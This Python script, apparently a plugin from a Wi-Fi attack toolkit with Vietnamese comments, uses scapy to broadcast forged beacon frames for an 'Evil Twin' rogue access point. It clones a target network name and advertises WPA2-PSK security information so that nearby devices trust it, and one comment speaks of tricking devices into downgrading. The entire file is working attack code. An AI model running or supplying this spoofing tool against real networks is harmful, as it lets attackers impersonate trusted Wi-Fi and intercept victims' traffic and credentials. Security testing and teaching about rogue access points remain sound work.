# plugins/evil_twin_setup.py
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

def main():
    if len(sys.argv) < 3:
        print("[-] Lỗi: Thiếu tham số.")
        sys.exit(1)
        
    interface = sys.argv[1]
    target_ssid = sys.argv[2]
    
    # Địa chỉ MAC của Rogue AP (bạn có thể đổi thành MAC của con Router WPA2 thật của bạn)
    rogue_mac = "00:11:22:33:44:55"

    print("\n[*] Bắt đầu chiến dịch: Phát sóng Rogue AP (Evil Twin)")
    print(f"    - SSID giả mạo : {target_ssid}")
    print(f"    - BSSID giả mạo: {rogue_mac}")
    print(f"[*] Đang phát Beacon Frame chuẩn WPA2-PSK để lừa thiết bị hạ cấp...")
    print("[!] Nhấn Ctrl+C để dừng phát sóng.\n")
    
    # Xây dựng khung gói tin Beacon (Access Point)
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=rogue_mac, addr3=rogue_mac)
    # Cờ 'privacy' báo hiệu mạng này có mật khẩu
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=target_ssid)
    
    # RSN Information Element (IE) - Khai báo đây là chuẩn WPA2-PSK để thiết bị tin tưởng
    rsn_ie = Dot11Elt(ID=48, info=b'\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00')
    
    # Ghép tất cả lại
    frame = RadioTap() / dot11 / beacon / essid / rsn_ie

    try:
        # Phát sóng liên tục (10 gói/giây - chuẩn của mọi Router thật)
        while True:
            sendp(frame, iface=interface, inter=0.1, verbose=False)
            
    except KeyboardInterrupt:
        print("\n[!] Dừng phát sóng Rogue AP.")

if __name__ == "__main__":
    main()